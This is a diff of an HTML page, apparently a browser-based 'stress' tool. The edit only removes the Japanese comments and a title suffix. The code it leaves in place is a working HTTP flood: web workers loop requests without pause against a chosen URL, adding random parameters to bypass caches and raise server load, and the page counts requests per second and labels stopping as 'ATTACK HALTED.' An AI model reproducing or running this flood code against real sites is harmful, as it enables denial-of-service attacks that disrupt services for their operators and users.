@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>STRESS ENGINE PRO - 最終安定版</title>
+    <title>STRESS ENGINE PRO</title>
     <style>
         :root { --bg: #000; --panel: #111; --accent: #0f0; --error: #f00; --text: #0f0; --dim: #050; }
         body { background: var(--bg); color: var(--text); font-family: 'Consolas', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
@@ -58,14 +58,13 @@
 </div>
 
 <script>
-// --- 完全稼働保証エンジンコード ---
+
 const workerCode = `
     let active = false;
     self.onmessage = async (e) => {
         const { url, method, cmd } = e.data;
         if (cmd === 'start') {
             active = true;
-            // 複数の内部ループを回して並列度を上げる
             for(let i=0; i<5; i++) {
                 runFlood(url, method);
             }
@@ -75,7 +74,7 @@ const workerCode = `
     async function runFlood(url, method) {
         while (active) {
             try {
-                // キャッシュ回避とサーバー負荷を上げるランダムパラメータ
+                
                 const bust = "?t=" + Date.now() + "r=" + Math.random().toString(36).substring(7);
                 const options = {
                     method: method,
@@ -91,7 +90,7 @@ const workerCode = `
             } catch (err) {
                 self.postMessage('err');
             }
-            // 1msの待機を入れることでブラウザのクラッシュ（ハング）を完全に防ぐ
+            
             await new Promise(r => setTimeout(r, 1));
         }
     }
@@ -137,7 +136,7 @@ document.getElementById('stop').onclick = () => {
     log("ATTACK HALTED.");
 };
 
-// メトリクス表示更新
+
 setInterval(() => {
     const currentRps = stats.total - stats.lastTotal;
     stats.lastTotal = stats.total;
